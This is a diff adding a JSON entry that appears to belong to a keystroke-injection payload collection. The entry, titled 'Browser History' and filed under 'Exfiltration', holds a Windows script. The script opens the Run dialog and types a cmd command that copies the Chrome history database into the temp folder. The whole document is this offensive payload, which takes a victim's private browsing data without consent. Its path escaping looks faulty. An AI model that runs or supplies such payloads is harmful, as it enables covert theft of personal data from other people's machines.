@@ -1,0 +1,7 @@
+{
+  "name": "Browser History",
+  "category": "Exfiltration",
+  "os": "Windows",
+  "description": "Extract browser history",
+  "script": "REM Browser History\nGUI r\nDELAY 500\nSTRING cmd /c copy %APPDATA%\\\\..\\\\Local\\\\Google\\\\Chrome\\\\User\\ Data\\\\Default\\\\History %temp%\\\\\nENTER\n"
+}
